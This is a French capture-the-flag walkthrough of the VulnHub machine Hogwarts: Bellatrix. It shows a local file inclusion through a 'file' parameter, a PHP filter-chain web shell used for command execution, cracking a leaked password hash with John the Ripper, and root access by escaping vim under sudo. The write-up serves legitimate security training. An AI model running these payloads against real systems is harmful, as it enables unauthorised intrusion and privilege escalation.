# Solution du CTF Hogwarts: Bellatrix de VulnHub

Le CTF [Hogwarts: Bellatrix](https://vulnhub.com/entry/hogwarts-bellatrix,609/) est un boot2root que je qualifierais de facile. Il y a un peu de jeu de piste mais n'entre jamais dans le mauvais penchant du guessing.

```
Nmap scan report for 192.168.56.64
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4bcec75a9c1f8bcd4703086985c29149 (RSA)
|   256 a12aa8159904cc2a1ee35000f355c2cc (ECDSA)
|_  256 2cd3ec6f4f5b4ae0ea0ac30d2fcb7817 (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: AvadaKedavra
|_http-server-header: Apache/2.4.46 (Ubuntu)
```

Sur le site web on trouve ce texte :

```
ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack

--- snip ---

ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack.php
```

et dans le code HTML de la page :

```html
    <!-- 
        Nah...this time there are no clues in the source code ... 
        o yeah, maybe I've already told you a directory .php? :)

    -->

/*

   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }

*/
```

Effectivement je trouve un fichier `ikilledsiriusblack.php` qui semble en tout point identique à la page d'index sauf que si on lui passe le paramètre `file` (ex: `file=/etc/passwd`) on obtient la LFI annoncée :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
--- snip ---
bellatrix:x:1000:1000:Bellatrix,,,:/home/bellatrix:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
lestrange:x:1001:1001::/home/lestrange:/bin/rbash
```

On peut déjà rermarquer la présence du `rbash` (restricted bash) comme login pour le compte `lestrange`.

Je ne perds plus mon temps à faire une injection dans un fichier de log, j'utilise directement la technique de chainage des filtres PHP avec [l'outil de Synacktiv](https://github.com/synacktiv/php_filter_chain_generator) :

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```

Je passe le résultat en paramètre de `file` et il ne reste qu'à rajouter mon paramètre `cmd` pour avoir ma RCE.

Déjà sous la racine web je trouve des fichiers étonnants :

```shellsession
www-data@bellatrix:/var/www/html$ ls -alR
.:
total 732
drwxr-xr-x 3 root      root        4096 Nov 28  2020  .
drwxr-xr-x 3 root      root        4096 Nov 28  2020  ..
-rw-rw-r-- 1 bellatrix bellatrix 728806 Nov 27  2020  1c19c879fe8ef134c3e051c2d69c0c66.gif
drwxr-xr-x 2 root      root        4096 Nov 28  2020 'c2VjcmV0cw=='
-rw-rw-r-- 1 bellatrix bellatrix    151 Nov 28  2020  ikilledsiriusblack.php
-rw-rw-r-- 1 bellatrix bellatrix   1728 Nov 28  2020  index.php

'./c2VjcmV0cw==':
total 16
drwxr-xr-x 2 root root 4096 Nov 28  2020 .
drwxr-xr-x 3 root root 4096 Nov 28  2020 ..
-rw-r--r-- 1 root root 1237 Nov 28  2020 .secret.dic
-rw-r--r-- 1 root root  117 Nov 28  2020 Swordofgryffindor
```

Le fichier `.secret.dic` est une wordlist de 114 lignes contenant des noms ou mots en rapport avec la saga *Harry Potter*.

Le fichier `Swordofgryffindor` contient le hash pour le compte vu précédemment :

`lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0`

Forcément ça ne prend pas long à casser et c'est l'une des caractéristiques des bons CTFs car entre passer une minute ou 2 jours à casser un mot de passe, il n'y a aucune différence au niveau des compétences requises, il suffit de savoir utiliser un outil :

```shellsession
$ ./john --wordlist=pass.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateharrypotter (lestrange)     
1g 0:00:00:00 DONE (2022-11-19 11:28) 9.090g/s 1036p/s 1036c/s 1036C/s gryffondor..wingardiumleviosa
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Une fois connecté on trouve une note dans un fichier `readme.txt` :

```shellsession
lestrange@bellatrix:~$ cat readme.txt
I WANT TO ESCAPE FROM THE PRISION OF AZKABAN

HAHAHAHHAHAHAHAHHAHAHAHHAHAHAHAHHAHAHAHHAHA!!!!

YOU WONT BE ABLE TO ME, POTTER!! I WAS AND STILL AM THE DARK LORD'S MOST 
LOYAL SERVANT.
```

L'utilisatrice a le droit d'exécuter une commande via sudo :

```shellsession
lestrange@bellatrix:~$ sudo -l
Coincidiendo entradas por defecto para lestrange en bellatrix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario lestrange puede ejecutar los siguientes comandos en bellatrix:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

La technique est bien sûr d'échapper de vim avec `:!/bin/bash` qui nous donne les droits root :

```shellsession
lestrange@bellatrix:~$ sudo /usr/bin/vim

root@bellatrix:/home/lestrange# cd /root
root@bellatrix:~# ls
root.txt  script.sh  snap
root@bellatrix:~# cat root.txt
 ____       _ _       _        _      
 |  _ \     | | |     | |      (_)     
 | |_) | ___| | | __ _| |_ _ __ ___  __
 |  _ < / _ \ | |/ _` | __| '__| \ \/ /
 | |_) |  __/ | | (_| | |_| |  | |>  < 
 |____/ \___|_|_|\__,_|\__|_|  |_/_/\_\
  _               _                              
 | |             | |                             
 | |     ___  ___| |_ _ __ __ _ _ __   __ _  ___ 
 | |    / _ \/ __| __| '__/ _` | '_ \ / _` |/ _ \
 | |___|  __/\__ \ |_| | | (_| | | | | (_| |  __/
 |______\___||___/\__|_|  \__,_|_| |_|\__, |\___|
                                       __/ |     
                                      |___/ 

root{ead5a85a11ba466011fced308d460a76}
root@bellatrix:~# cat script.sh
#!/bin/bash

chmod 775 /var/log/auth.log

exit
```

On voit un script qui effectue un chmod sur `auth.log`, il était sans doute destiné à faciliter l'injection de code PHP pour la LFI.

Il y avait aussi un flag dans `/home/bellatrix`. La commande `cd` était restreinte mais les commandes `ls` et cat `non` donc il n'y avait pas de difficultées majeures à obtenir le flag.

*Publié le 19 novembre 2022*
